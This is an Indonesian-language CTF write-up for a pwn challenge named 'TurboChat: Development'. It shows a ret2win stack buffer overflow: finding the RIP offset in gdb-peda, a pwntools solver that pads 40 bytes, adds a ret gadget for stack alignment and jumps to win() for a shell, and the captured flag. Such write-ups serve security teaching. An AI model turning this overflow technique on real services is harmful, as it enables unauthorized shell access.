# TurboChat: Development

## SOLUTION

1. Pada challenge ini, kita diberikan sebuah binary file dengan arsitektur 64 bit dan tidak di strip.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/09b3456f-0e48-4dae-ba44-a96325cc4810)


2. Langsung saja kita cek binary protectionsnya:

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/02b94d62-4c72-481c-b18e-4d39453943b3)


3. Diberikan proteksi yang sama seperti challenge yang sebelumnya. Namun kali ini saya tidak men-decompile binary file, saya meng-disass binary filenya.
4. Mengingat tidak di strip, maka kita dapat mengecek semua nama fungsi pada binary file:

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/a6827efe-ef49-4e1d-a2b4-674027ae663f)


5. Terdapat fungsi win(), asumsi saya disini konsep pwn kali ini adalah ret2win.
6. Untuk memastikan hal ini, langsung saja kita disass fungsi win():

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/80c7b9ff-e2ed-4e1c-b9e3-814f923214de) 

7. Meskipun tidak terbaca dengan jelas apakah terdapat strings "/bin/sh" yang digunakan pada argumen fungsi system(), akan tetapi disini saya cukup malas untuk mendecompile binary file.
8. Maka langsung saja saya mencari RIP offset lalu loncat ke fungsi win() , jika tidak mendapatkan shell berarti kita harus melakukan sedikit ROP.

##### NOTES: Dengan berhasil mendapatkan segmentation fault dan mendapatkan offset yang tepat pada RIP, maka kita dapat mengontrol next address yang akan dipanggil di stack.

#### GETTING RIP OFFSET 

9. Untuk mendapatkan offsetnya saya mengirim 1024 bytes menggunakan gdb-peda untuk mendapatkan segmentation fault.
10. Setelah SIGSEGV didapat, saya menjalankan pattern search untuk melihat offset pada RSP.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/ca35ce49-e859-48c7-a607-5a465641b227)


11. Tidak lupa untuk menambahkan ret gadget setelah padding dengan tujuan untuk melakukan stack alignment.
12. Berikut adalah solver yang saya gunakan:
    
```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

padding = 40 # offset RIP 

p = flat([
    asm('nop') * padding,
    0x000000000040101a, #  stack align - ret addr
    elf.sym['win'] 
])

sh.sendline(b'1')
sh.sendline(p)
sh.interactive() # get shell
```

13. Saatnya kita tes di local terlebih dahulu:

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/ed0ac567-b962-4732-8f0e-531498ef38b5)


14. Shell berhasil didapat! Langsung saja kita send script remotely.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/dc439806-1cf9-4a5a-a29a-dc88a4a7fdd6) 


```
ForestyHC{ez_ret2win_n_stack_alignment_just_to_remember_2adf8a}
```

